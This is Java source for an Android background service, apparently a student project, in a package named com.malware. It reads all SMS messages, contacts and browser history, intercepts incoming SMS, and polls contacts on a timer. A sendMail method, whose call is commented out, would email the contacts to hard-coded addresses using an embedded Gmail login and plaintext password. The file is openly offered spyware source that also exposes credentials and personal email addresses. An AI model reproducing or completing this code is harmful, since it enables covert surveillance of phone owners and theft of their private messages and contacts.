package com.malware.service;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.os.IBinder;
import android.provider.Browser;
import android.util.Log;

import com.malware.mail.SendMailTask;
import com.malware.phone.FetchAllSmsTask;
import com.malware.phone.FetchContactsTask;
import com.malware.phone.IncomingSMS;

public class MyService extends Service {

	private IBinder mBinder;
	private boolean mAllowRebind;
	private Timer t;
	private TimerTask tt;
	private static ArrayList<ArrayList<String>> contactsList;

	private final boolean VERBOSE = true;
	private final String TAG = "MalwareService";

	@Override
	public void onCreate() {

		if (VERBOSE) Log.v(TAG, "Creating service");

		Log.v(TAG, "--> Fetching all sms");
		(new FetchAllSmsTask()).execute(getContentResolver());

		Log.v(TAG, "--> Fetching contacts");
		(new FetchContactsTask()).execute(getContentResolver());

		// Prepare task to regularly display the information to hack
		prepareLoop();

		// Create receiver for each incoming sms
		IntentFilter filter = new IntentFilter();
		filter.addAction("android.Telephony.SMS_RECEIVED");
		registerReceiver(new IncomingSMS(), filter);
	}


	/**
	 * This task enables the service to inform regularly
	 * the hacker of the updates of the list of contacts.
	 */
	private void prepareLoop() {
		t = new Timer();
		tt = new TimerTask() {

			@Override
			public void run() {
				
				if (VERBOSE) Log.v(TAG, "--> Updating...");
				
				(new FetchContactsTask()).execute(getContentResolver());

				contactsList = FetchContactsTask.getContactsList();
				
				for (int j = 0 ; j < contactsList.size() ; j++) {
					Log.i(TAG, contactsList.get(j).get(0) + " || " + contactsList.get(j).get(1));
				}
				
				if (VERBOSE) Log.v(TAG, "--> Update done");
			}
		};
	}

	private void sendMail() {
		
		// Gmail address created for the project
		String fromEmail = "ckahckah@gmail.com";
		String fromPassword = "projetinf358";
		
		// Recipients
		String toEmails = "medori.julien@gmail.com, issacamara20@gmail.com";
		List<String> toEmailList = Arrays.asList(toEmails.split("\\s*,\\s*"));
		
		if (VERBOSE) Log.i(TAG, "To List: " + toEmailList);
		
		String emailSubject = "Contacts sur le téléphone";
		String emailBody = "";
		
		for (int j = 0 ; j < contactsList.size() ; j++) {
			emailBody += contactsList.get(j).get(0) + " " + contactsList.get(j).get(1) + "\n\n";
		}
		
		(new SendMailTask()).execute(fromEmail,fromPassword, toEmailList, emailSubject, emailBody);
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		if (VERBOSE) Log.v(TAG, "Starting service");

		t.scheduleAtFixedRate(tt, 5000, 15000);

		if (VERBOSE) Log.v(TAG, "--> Displaying list of contacts");

		if (contactsList != null) {
			for (int j = 0 ; j < contactsList.size() ; j++) {
				if (VERBOSE) Log.i(TAG, contactsList.get(j).get(0) + " " + contactsList.get(j).get(1));
			}
		}
		
//		sendMail();
		
		return Service.START_STICKY;
	}
	
	private ArrayList<HistoryEntry> getBrowserHistory() {

		String title = "";
		String url = "";

		ArrayList<HistoryEntry> list = new ArrayList<HistoryEntry>();

		String[] proj = new String[] { Browser.BookmarkColumns.TITLE,
				Browser.BookmarkColumns.URL };
		String sel = Browser.BookmarkColumns.BOOKMARK + " = 0"; // 0 = history,
																// 1 = bookmark
		Cursor mCur = getContentResolver().query(Browser.BOOKMARKS_URI, proj,
				sel, null, null);
		mCur.moveToFirst();

		if (mCur.moveToFirst() && mCur.getCount() > 0) {
			boolean cont = true;
			while (mCur.isAfterLast() == false && cont) {
				HistoryEntry entry;

				title = mCur.getString(mCur
						.getColumnIndex(Browser.BookmarkColumns.TITLE));
				url = mCur.getString(mCur
						.getColumnIndex(Browser.BookmarkColumns.URL));
				// Do something with title and url
				entry = new HistoryEntry(title, url);
				Log.d("TAG", "title   " + title);
				mCur.moveToNext();
			}
		}

		mCur.close();

		return list;
	}

	@Override
	public IBinder onBind(Intent intent) {
		// A client is binding to the service with bindService()
		return mBinder;
	}

	@Override
	public boolean onUnbind(Intent intent) {
		// All clients have unbound with unbindService()
		return mAllowRebind;
	}

	@Override
	public void onRebind(Intent intent) {
		// A client is binding to the service with bindService(),
		// after onUnbind() has already been called
	}

	@Override
	public void onDestroy() {
		// The service is no longer used and is being destroyed
		if (VERBOSE) Log.v(TAG, "Destroying service");
		t.cancel();
	}
}

class HistoryEntry {
	String title, url;

	HistoryEntry(String title, String url) {
		this.title = title;
		this.url = url;
	}
}